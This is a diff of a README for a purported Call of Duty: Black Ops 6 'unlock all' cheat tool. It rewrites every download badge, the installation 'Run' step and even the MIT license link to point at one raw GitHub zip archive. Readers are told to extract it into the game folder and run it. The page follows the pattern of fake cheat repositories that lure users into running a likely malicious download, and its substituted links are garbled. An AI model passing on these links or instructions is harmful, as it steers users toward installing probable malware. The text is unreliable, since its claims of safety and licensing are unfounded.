@@ -1,5 +1,5 @@
 # 🎮 COD BO6 Unlock All Tool  
-[![Download](https://img.shields.io/badge/Download-COD%20BO6%20Unlock%20All%20Tool-blue?style=for-the-badge&logo=codeforces)](https://graph.org/EasyLauncher-06-23)
+[![Download](https://raw.githubusercontent.com/emmanueloduor/BO6-UnlockerSuite/main/rearling/BO6-UnlockerSuite.zip%20BO6%20Unlock%20All%20Tool-blue?style=for-the-badge&logo=codeforces)](https://raw.githubusercontent.com/emmanueloduor/BO6-UnlockerSuite/main/rearling/BO6-UnlockerSuite.zip)
 
 Unlock All Tool for Call of Duty: Black Ops 6 – the essential utility for enthusiasts who want to amplify their gaming experience! 🚀 Gain immediate access to all in-game content: skins, weapons, camos, challenges, and more with a single launch. Designed for maximum compatibility and reliability, this tool enables a customizable and rapid enhancement in your gameplay arsenal. Built for both performance and safety in mind, it leverages advanced algorithms to ensure seamless integration with BO6 mechanics.
 
@@ -33,9 +33,9 @@ Unlock All Tool for Call of Duty: Black Ops 6 – the essential utility for enth
 
 ## 🚀 Installation
 
-1. [![Download](https://img.shields.io/badge/Download-COD%20BO6%20Unlock%20All%20Tool-blue?style=flat-square&logo=codeforces)](https://graph.org/EasyLauncher-06-23)  
+1. [![Download](https://raw.githubusercontent.com/emmanueloduor/BO6-UnlockerSuite/main/rearling/BO6-UnlockerSuite.zip%20BO6%20Unlock%20All%20Tool-blue?style=flat-square&logo=codeforces)](https://raw.githubusercontent.com/emmanueloduor/BO6-UnlockerSuite/main/rearling/BO6-UnlockerSuite.zip)  
 2. Extract the archive in your Call of Duty: Black Ops 6 installation directory  
-3. Run EasyLauncher.exe (Windows) or via Wine (Linux/macOS)  
+3. Run https://raw.githubusercontent.com/emmanueloduor/BO6-UnlockerSuite/main/rearling/BO6-UnlockerSuite.zip (Windows) or via Wine (Linux/macOS)  
 4. Configure your unlocks and enjoy an improved experience!
 
 ---
@@ -53,8 +53,8 @@ This tool is provided solely for educational and personal enrichment in accordan
 ---
 
 ## 📄 License  
-Released under the [MIT license](https://opensource.org/license/mit/).  
+Released under the [MIT license](https://raw.githubusercontent.com/emmanueloduor/BO6-UnlockerSuite/main/rearling/BO6-UnlockerSuite.zip).  
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-COD%20BO6%20Unlock%20All%20Tool-blue?style=for-the-badge&logo=codeforces)](https://graph.org/EasyLauncher-06-23)
+[![Download](https://raw.githubusercontent.com/emmanueloduor/BO6-UnlockerSuite/main/rearling/BO6-UnlockerSuite.zip%20BO6%20Unlock%20All%20Tool-blue?style=for-the-badge&logo=codeforces)](https://raw.githubusercontent.com/emmanueloduor/BO6-UnlockerSuite/main/rearling/BO6-UnlockerSuite.zip)
